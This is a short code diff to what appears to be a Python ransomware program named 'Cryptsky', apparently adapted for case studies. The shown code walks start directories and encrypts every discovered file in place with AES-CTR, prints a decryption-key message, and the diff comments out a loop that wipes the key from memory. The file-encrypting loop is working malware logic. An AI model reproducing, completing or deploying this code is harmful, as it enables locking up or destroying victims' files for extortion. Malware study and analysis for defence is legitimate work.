@@ -3,6 +3,7 @@ from Cryptodome.Cipher import AES
 from Cryptodome.Util import Counter
 import argparse
 import os
+import random
 import discover
 import modify
 from subprocess import call
@@ -64,13 +65,15 @@ Your decryption key is: %s
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
             modify.modify_file_inplace(file, crypt.encrypt)
-            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
+            # os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
 
+    ''' # Taken out for Case Studies
     # This wipes the key out of memory
     # to avoid recovery by third party tools
     for _ in range(100):
-        #key = random(32)
+        key = random(32)
         pass
+    '''
 
     if not decrypt:
         pass
@@ -78,7 +81,6 @@ Your decryption key is: %s
          # desktop picture
          # icon, etc
 
-    main()
 
 if __name__=="__main__":
     main()
